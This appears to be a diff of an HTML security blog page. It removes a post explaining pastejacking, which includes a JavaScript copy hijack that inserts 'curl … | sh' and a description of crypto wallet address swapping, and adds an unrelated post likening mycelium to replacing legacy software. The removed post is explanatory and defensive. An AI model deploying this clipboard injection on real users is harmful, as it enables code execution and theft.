@@ -7,20 +7,20 @@
 <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
 
 
-<meta name="description" content="The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as pastejacking, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.
+<meta name="description" content="Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.
 " />
-<meta property="og:description" content="The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as pastejacking, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.
+<meta property="og:description" content="Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.
 " />
 
 <meta name="author" content="forkbomb.io" />
 
 
-<meta property="og:title" content="Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" />
-<meta property="twitter:title" content="Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" />
+<meta property="og:title" content="Mycelial Lessons for Securing the Software Supply Chain" />
+<meta property="twitter:title" content="Mycelial Lessons for Securing the Software Supply Chain" />
 
 
 
-    <title>Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data – forkbomb.io – secure state of mind</title>
+    <title>Mycelial Lessons for Securing the Software Supply Chain – forkbomb.io – secure state of mind</title>
 
     <link rel="stylesheet" type="text/css" href="/style.css"/>
     <link rel="stylesheet" type="text/css" href="https://unpkg.com/ress/dist/ress.min.css"/>
@@ -80,77 +80,51 @@
 
     <div id="main" role="main" class="container">
       <article class="post">
-  <h1>Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data</h1>
+  <h1>Mycelial Lessons for Securing the Software Supply Chain</h1>
 
   <div class="entry">
-    <p>The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as <a href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</p>
+    <p>Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.</p>
 
-<p>Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.</p>
+<p>Tech debt refers to the cost of maintaining and updating older software systems that are no longer supported or have become obsolete. This can be a significant burden on organizations, as they must devote resources to maintaining and updating systems that are no longer providing the desired functionality or performance. In the same way, dead and old material in a forest can become an obstacle to growth and progress.</p>
 
-<p>Server-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. 
-Using methods such as <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">cross-site scripting (XSS) attacks</a>, an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.</p>
+<p>I’m lucky enough to live in San Francisco, in the heart of the redwood coast. I’ve recently had luck foraging mycorrhizal mushrooms that grow in abundance here.</p>
 
-<h2 id="how-javascript-pastejacking-works">How Javascript Pastejacking Works</h2>
+<p><img src="../../../../../assets/image/mycelial-lessons-software-supply-chain-security.jpg" alt="bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles" title="bag full of mushrooms foraged on the redwood coast, including boletes and chanterelles" /></p>
 
-<p>For demonstration purposes, let’s take a look at the following Javascript code snippet:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
-document.getElementById('copied-text').addEventListener('copy', 
-function(e) {
-    e.clipboardData.setData('text/plain', 
-        'curl https://forkbomb.io/shadowrealm | sh\n'
-    );
-    e.preventDefault();
-});
-&lt;/script&gt;
-</code></pre></div></div>
+<p>The relationship these mushrooms have with their environment made me realize several things about software supply chain security.</p>
 
-<p>Attackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.</p>
+<h3 id="mycelial-lessons-in-handling-tech-debt">Mycelial Lessons in Handling Tech Debt</h3>
 
-<h2 id="using-pastejacking-to-attack-developers">Using Pastejacking to Attack Developers</h2>
+<p>Just as fungus helps to break down dead and old material in the forest, legacy software can also be broken down and replaced with new software that is better suited to the organization’s needs. This replacement process can be challenging, as it requires a significant investment of time and resources. But, in the long run, it can save organizations a great deal of money and improve their overall efficiency.</p>
 
-<p>Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.</p>
+<p>One way to approach the process of replacing legacy software is to take a phased approach, similar to how a forest will decompose a fallen tree. Instead of trying to replace all the software at once, organizations can start by replacing the most critical systems first, and then gradually work their way through the rest of the software. This can minimize the risk of disruption to the organization’s operations while also allowing them to take advantage of the benefits of new software more quickly.</p>
 
-<p>The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://forkbomb.io/shadowrealm | sh\n
-</code></pre></div></div>
-<p>This string is a curl command that navigates a user to the URL <a href="https://forkbomb.io/shadowrealm/">https://forkbomb.io/shadowrealm</a>, which in this case is a striking yet graceful warning to users.</p>
+<p>In conclusion, just as fungus plays a vital role in breaking down dead and old material in forests, it can also help us to learn how to replace legacy software and eliminate tech debt. Organizations can minimize disruption and improve efficiency by taking a phased approach and focusing on critical systems first. By breaking down tech debt, organizations can free up resources to invest in more strategic initiatives. This can lead to more innovation, better performance, and better end-user experience.</p>
 
-<p>Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.</p>
+<h3 id="benefits-of-deprecating-legacy-software">Benefits of Deprecating Legacy Software</h3>
 
-<p>This form of attack can be hazardous as this can be a form of <a href="https://cycode.com/blog/why-developers-are-hackers-new-targets-and-what-to-do-about-it/">targeting developers</a> who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances.</p>
+<h4 id="lesson-1-break-down-old-dead-material">Lesson 1) Break Down Old, Dead Material</h4>
 
-<h2 id="using-pastejacking-to-attack-crypto-wallets">Using Pastejacking to Attack Crypto Wallets</h2>
+<p>The mycelium’s relationship with decay highlights the importance of continuously removing dead and old material to support growth and progress. In a similar way, deprecating and replacing legacy software with modern software built adhering to modern security standards can help improve software supply chain security by reducing the risk of vulnerabilities and attacks.</p>
 
-<p>More nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above.</p>
+<p>In addition, modern software is updated regularly with security patches and new features, helping to keep systems secure and prevent security incidents. By replacing legacy software with modern software, organizations can take advantage of the latest security protocols and technologies, reducing the risk of cyberattacks and data breaches. This, in turn, helps to build trust in the software supply chain and ensures that sensitive information is protected from cyber threats. Overall, the benefits of modern software for software supply chain security are significant, and organizations that prioritize deprecating and replacing legacy software are well-positioned to protect their digital assets and maintain a strong security posture.</p>
 
-<p>Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:</p>
+<h4 id="lesson-2-adapt-and-evolve">Lesson 2) Adapt and Evolve</h4>
 
-<p><img src="../../../../../assets/image/pastejacking-crypto-wallets-forkbomb-address-theft-defi.png" alt="pastejacking-crypto-wallets-forkbomb-address-theft-defi" class="img-responsive" /></p>
+<p>The mycelium’s ability to adapt and evolve in response to changes in its environment is a powerful example of resilience and the importance of continuous improvement. Deprecating and replacing legacy software with modern software built to meet today’s security standards can improve the resilience of the software supply chain and increase its ability to respond to changing threats and vulnerabilities.</p>
 
-<p>You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.</p>
+<p>Modern software is built to adhere to current security standards and is designed to address the latest security threats. For example, modern software may include features like encryption, multi-factor authentication, and firewalls to prevent unauthorized access to sensitive information. These features help to prevent cyberattacks and reduce the risk of data breaches.</p>
 
-<p>In the case of Metamask, tools such as <a href="https://github.com/LavaMoat/LavaMoat">LavaMoat</a> are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.</p>
+<h4 id="lesson-3-support-growth-and-renewal">Lesson 3) Support Growth and Renewal</h4>
 
-<h2 id="preventing-crypto-theft">Preventing Crypto Theft</h2>
-<p>As users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:</p>
-<ul>
-  <li>Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction.</li>
-  <li>At least double/triple check the first 4 characters of the contract to see that they match up.</li>
-  <li>Investigate suspicious contracts, especially if there is high outflow to another contract address.</li>
-  <li>If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address</li>
-</ul>
+<p>The mycelium’s role in breaking down dead and old material to support growth and renewal is similar to the role of deprecating and replacing legacy software in promoting software supply chain security. By removing older, unsupported software and replacing it with modern software built to meet current security standards, organizations can reduce their risk of attacks and increase their ability to respond to changing security threats. This can help ensure the long-term health and security of the software supply chain.</p>
 
-<p>Unfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.</p>
-
-<h2 id="key-learnings-for-defi-developers">Key Learnings for Defi Developers</h2>
-
-<p>Just like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.</p>
-
+<p>Deprecating and replacing legacy software with modern software built with modern security standards is critical for the security of the software supply chain. Legacy software systems, by their very nature, are vulnerable to exploitation due to outdated security protocols, lack of security updates, and other factors. These systems can easily become a target for cyberattacks, leading to data breaches, theft of sensitive information, and other security incidents.</p>
 
   </div>
 
   <div class="date">
-    <i class="fa fa-calendar fa-fw" aria-hidden="true"></i>&nbsp;Date:<span style="color: #333333; font-weight: normal;">&nbsp;December 31, 2021</span>
+    <i class="fa fa-calendar fa-fw" aria-hidden="true"></i>&nbsp;Date:<span style="color: #333333; font-weight: normal;">&nbsp;February 10, 2023</span>
   </div>
 
   <div class="post-categories">
@@ -165,7 +139,7 @@ function(e) {
   <div class="share-post">
     <i class="fa fa-share-alt-square fa-fw" aria-hidden="true"></i>&nbsp;Share:&nbsp;
     <!-- Sharingbutton Facebook -->
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=http://localhost:4000/blog/pastejacking-smart-contracts" title="Share on Facebook" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share on Facebook" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>
     </div>
@@ -173,7 +147,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Twitter -->
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;url=http://localhost:4000/blog/pastejacking-smart-contracts" title="Share on Twitter" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Mycelial Lessons for Securing the Software Supply Chain&amp;url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share on Twitter" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>
     </div>
@@ -181,7 +155,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Tumblr -->
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;content=http://localhost:4000/blog/pastejacking-smart-contracts&amp;canonicalUrl=http://localhost:4000/blog/pastejacking-smart-contracts&amp;shareSource=tumblr_share_button" title="Share on Tumblr" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Mycelial Lessons for Securing the Software Supply Chain&amp;content=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;canonicalUrl=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;shareSource=tumblr_share_button" title="Share on Tumblr" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.5.5v5h5v4h-5V15c0 5 3.5 4.4 6 2.8v4.4c-6.7 3.2-12 0-12-4.2V9.5h-3V6.7c1-.3 2.2-.7 3-1.3.5-.5 1-1.2 1.4-2 .3-.7.6-1.7.7-3h3.8z"/></svg>
     </div>
@@ -189,7 +163,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton E-Mail -->
-<a class="resp-sharing-button__link" href="mailto:?subject=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;body=Read more at this site http://localhost:4000/blog/pastejacking-smart-contracts" title="Share via E-Mail" target="_self" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="mailto:?subject=Mycelial Lessons for Securing the Software Supply Chain&amp;body=Read more at this site http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share via E-Mail" target="_self" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22 4H2C.9 4 0 4.9 0 6v12c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17 0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1 0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08 0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z"/></svg>
     </div>
@@ -197,7 +171,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Pinterest -->
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=http://localhost:4000/blog/pastejacking-smart-contracts&amp;media=http://localhost:4000/blog/pastejacking-smart-contracts&amp;description=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" title="Share on Pinterest" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;media=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;description=Mycelial Lessons for Securing the Software Supply Chain" title="Share on Pinterest" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.14.5C5.86.5 2.7 5 2.7 8.75c0 2.27.86 4.3 2.7 5.05.3.12.57 0 .66-.33l.27-1.06c.1-.32.06-.44-.2-.73-.52-.62-.86-1.44-.86-2.6 0-3.33 2.5-6.32 6.5-6.32 3.55 0 5.5 2.17 5.5 5.07 0 3.8-1.7 7.02-4.2 7.02-1.37 0-2.4-1.14-2.07-2.54.4-1.68 1.16-3.48 1.16-4.7 0-1.07-.58-1.98-1.78-1.98-1.4 0-2.55 1.47-2.55 3.42 0 1.25.43 2.1.43 2.1l-1.7 7.2c-.5 2.13-.08 4.75-.04 5 .02.17.22.2.3.1.14-.18 1.82-2.26 2.4-4.33.16-.58.93-3.63.93-3.63.45.88 1.8 1.65 3.22 1.65 4.25 0 7.13-3.87 7.13-9.05C20.5 4.15 17.18.5 12.14.5z"/></svg>
     </div>
@@ -205,7 +179,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton LinkedIn -->
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/pastejacking-smart-contracts&amp;title=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;summary=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;source=http://localhost:4000/blog/pastejacking-smart-contracts" title="Share on LinkedIn" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;title=Mycelial Lessons for Securing the Software Supply Chain&amp;summary=Mycelial Lessons for Securing the Software Supply Chain&amp;source=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share on LinkedIn" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>
     </div>
@@ -213,7 +187,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Reddit -->
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=http://localhost:4000/blog/pastejacking-smart-contracts&amp;resubmit=true&amp;title=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" title="Share on Reddit" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;resubmit=true&amp;title=Mycelial Lessons for Securing the Software Supply Chain" title="Share on Reddit" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M24 11.5c0-1.65-1.35-3-3-3-.96 0-1.86.48-2.42 1.24-1.64-1-3.75-1.64-6.07-1.72.08-1.1.4-3.05 1.52-3.7.72-.4 1.73-.24 3 .5C17.2 6.3 18.46 7.5 20 7.5c1.65 0 3-1.35 3-3s-1.35-3-3-3c-1.38 0-2.54.94-2.88 2.22-1.43-.72-2.64-.8-3.6-.25-1.64.94-1.95 3.47-2 4.55-2.33.08-4.45.7-6.1 1.72C4.86 8.98 3.96 8.5 3 8.5c-1.65 0-3 1.35-3 3 0 1.32.84 2.44 2.05 2.84-.03.22-.05.44-.05.66 0 3.86 4.5 7 10 7s10-3.14 10-7c0-.22-.02-.44-.05-.66 1.2-.4 2.05-1.54 2.05-2.84zM2.3 13.37C1.5 13.07 1 12.35 1 11.5c0-1.1.9-2 2-2 .64 0 1.22.32 1.6.82-1.1.85-1.92 1.9-2.3 3.05zm3.7.13c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm9.8 4.8c-1.08.63-2.42.96-3.8.96-1.4 0-2.74-.34-3.8-.95-.24-.13-.32-.44-.2-.68.15-.24.46-.32.7-.18 1.83 1.06 4.76 1.06 6.6 0 .23-.13.53-.05.67.2.14.23.06.54-.18.67zm.2-2.8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm5.7-2.13c-.38-1.16-1.2-2.2-2.3-3.05.38-.5.97-.82 1.6-.82 1.1 0 2 .9 2 2 0 .84-.53 1.57-1.3 1.87z"/></svg>
     </div>
@@ -221,7 +195,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton XING -->
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;http://localhost:4000/blog/pastejacking-smart-contracts;title=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" title="Share on XING" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain;title=Mycelial Lessons for Securing the Software Supply Chain" title="Share on XING" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10.2 9.7l-3-5.4C7.2 4 7 4 6.8 4h-5c-.3 0-.4 0-.5.2v.5L4 10 .4 16v.5c0 .2.2.3.4.3h5c.3 0 .4 0 .5-.2l4-6.6v-.5zM24 .2l-.5-.2H18s-.2 0-.3.3l-8 14v.4l5.2 9c0 .2 0 .3.3.3h5.4s.3 0 .4-.2c.2-.2.2-.4 0-.5l-5-8.8L24 .7V.2z"/></svg>
     </div>
@@ -229,7 +203,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton WhatsApp -->
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data%20http://localhost:4000/blog/pastejacking-smart-contracts" title="Share via WhatsApp" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Mycelial Lessons for Securing the Software Supply Chain%20http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share via WhatsApp" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.1 3.9C17.9 1.7 15 .5 12 .5 5.8.5.7 5.6.7 11.9c0 2 .5 3.9 1.5 5.6L.6 23.4l6-1.6c1.6.9 3.5 1.3 5.4 1.3 6.3 0 11.4-5.1 11.4-11.4-.1-2.8-1.2-5.7-3.3-7.8zM12 21.4c-1.7 0-3.3-.5-4.8-1.3l-.4-.2-3.5 1 1-3.4L4 17c-1-1.5-1.4-3.2-1.4-5.1 0-5.2 4.2-9.4 9.4-9.4 2.5 0 4.9 1 6.7 2.8 1.8 1.8 2.8 4.2 2.8 6.7-.1 5.2-4.3 9.4-9.5 9.4zm5.1-7.1c-.3-.1-1.7-.9-1.9-1-.3-.1-.5-.1-.7.1-.2.3-.8 1-.9 1.1-.2.2-.3.2-.6.1s-1.2-.5-2.3-1.4c-.9-.8-1.4-1.7-1.6-2-.2-.3 0-.5.1-.6s.3-.3.4-.5c.2-.1.3-.3.4-.5.1-.2 0-.4 0-.5C10 9 9.3 7.6 9 7c-.1-.4-.4-.3-.5-.3h-.6s-.4.1-.7.3c-.3.3-1 1-1 2.4s1 2.8 1.1 3c.1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.6-.1 1.7-.7 1.9-1.3.2-.7.2-1.2.2-1.3-.1-.3-.3-.4-.6-.5z"/></svg>
     </div>
@@ -237,7 +211,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Hacker News -->
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/blog/pastejacking-smart-contracts&amp;t=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data" title="Share on Hacker News" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain&amp;t=Mycelial Lessons for Securing the Software Supply Chain" title="Share on Hacker News" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 140"><path fill-rule="evenodd" d="M60.94 82.314L17 0h20.08l25.85 52.093c.397.927.86 1.888 1.39 2.883.53.994.995 2.02 1.393 3.08.265.4.463.764.596 1.095.13.334.262.63.395.898.662 1.325 1.26 2.618 1.79 3.877.53 1.26.993 2.42 1.39 3.48 1.06-2.254 2.22-4.673 3.48-7.258 1.26-2.585 2.552-5.27 3.877-8.052L103.49 0h18.69L77.84 83.308v53.087h-16.9v-54.08z"></path></svg>
     </div>
@@ -245,7 +219,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton VK -->
-<a class="resp-sharing-button__link" href="http://vk.com/share.php?title=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;url=http://localhost:4000/blog/pastejacking-smart-contracts" title="Share on VK" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="http://vk.com/share.php?title=Mycelial Lessons for Securing the Software Supply Chain&amp;url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share on VK" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--vk resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.547 7h-3.29a.743.743 0 0 0-.655.392s-1.312 2.416-1.734 3.23C14.734 12.813 14 12.126 14 11.11V7.603A1.104 1.104 0 0 0 12.896 6.5h-2.474a1.982 1.982 0 0 0-1.75.813s1.255-.204 1.255 1.49c0 .42.022 1.626.04 2.64a.73.73 0 0 1-1.272.503 21.54 21.54 0 0 1-2.498-4.543.693.693 0 0 0-.63-.403h-2.99a.508.508 0 0 0-.48.685C3.005 10.175 6.918 18 11.38 18h1.878a.742.742 0 0 0 .742-.742v-1.135a.73.73 0 0 1 1.23-.53l2.247 2.112a1.09 1.09 0 0 0 .746.295h2.953c1.424 0 1.424-.988.647-1.753-.546-.538-2.518-2.617-2.518-2.617a1.02 1.02 0 0 1-.078-1.323c.637-.84 1.68-2.212 2.122-2.8.603-.804 1.697-2.507.197-2.507z"/></svg>
     </div>
@@ -253,7 +227,7 @@ function(e) {
 </a>
 
 <!-- Sharingbutton Telegram -->
